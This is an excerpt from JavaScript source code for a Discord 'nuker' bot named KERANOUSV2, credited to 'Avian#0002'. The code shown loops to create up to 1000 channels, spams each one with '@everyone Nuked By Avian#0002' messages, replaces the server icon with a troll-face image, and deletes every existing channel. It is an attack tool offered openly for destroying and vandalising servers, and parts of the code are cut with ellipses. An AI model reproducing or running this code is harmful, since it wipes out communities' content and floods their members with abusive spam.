...
client.on('ready', () => {
    function main() {
    clear()
    client.user.setActivity('Keranous by Avian#0002', { type: 'PLAYING' })
...
console.log(red(`
    ────────────────────────────────────────────────────────────────────────────────
                            `)+redBright(`Made by Avian#0002`)+yellowBright(`
        ...
        if (answer == "1") {
                ...
                if (!guild) {
                    ...
                    for(let i = 0; i < 1000; i++) {
                        guild.channels.create(channel_name).then(channel => {
                            channel.send("@everyone Nuked By Avian#0002 KERANOUSV2 ON TOP | " + message_text)
                            channel.send("@everyone Nuked By Avian#0002 KERANOUSV2 ON TOP | " + message_text)
                            channel.send("@everyone Nuked By Avian#0002 KERANOUSV2 ON TOP | " + message_text)
                            channel.send("@everyone Nuked By Avian#0002 KERANOUSV2 ON TOP | " + message_text)
                            channel.send("@everyone Nuked By Avian#0002 KERANOUSV2 ON TOP | " + message_text)
            ...
            rl.question(yellow('[KERANOUSV2INPUT] GUILD ID: '), (guildid) => {
                ...
                if (!guild) {
                    ...
                    guild.setIcon("https://cdn11.bigcommerce.com/s-jbg7mp3qyd/products/3811/images/5573/troll_face_meme__47364.1501204311.380.380.jpg?c=2")
                    guild.channels.cache.forEach(channel => {
                        channel.delete().then(() => {
                            console.log(green('[+] Deleted ' + channel.name+'/'+channel.id))
                        })
